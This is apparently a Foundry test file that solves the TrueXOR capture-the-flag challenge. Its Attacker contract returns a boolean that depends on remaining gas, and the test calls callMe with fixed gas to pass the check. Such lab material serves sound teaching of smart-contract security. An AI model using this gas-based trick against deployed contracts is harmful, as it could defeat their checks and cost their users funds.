// SPDX-License-Identifier: GPL-3.0
pragma solidity 0.8.7;

import "forge-std/Test.sol";
import "forge-std/console.sol";

import {TrueXOR, IBoolGiver} from "../src/TrueXOR.sol";

contract Attacker is IBoolGiver {
    function giveBool() external view override returns (bool) {
        return gasleft() >= 4000;
    }
}

contract TrueXORTest is Test {
    address hacker = makeAddr("hacker");
    TrueXOR private challenge;

    function setUp() external {
        challenge = new TrueXOR();
    }

    function test_hack() external {
        /**
          Objective of CTF
          - Make a successful call to the `callMe` function.
          - The given `target` parameter should belong to a contract deployed by you and should use `IBoolGiver` interface.
         */
        vm.startPrank(hacker, hacker);
        Attacker attacker = new Attacker();
        bool success = challenge.callMe{gas: 5000}(address(attacker));
        vm.stopPrank();

        assertTrue(success);
    }
}
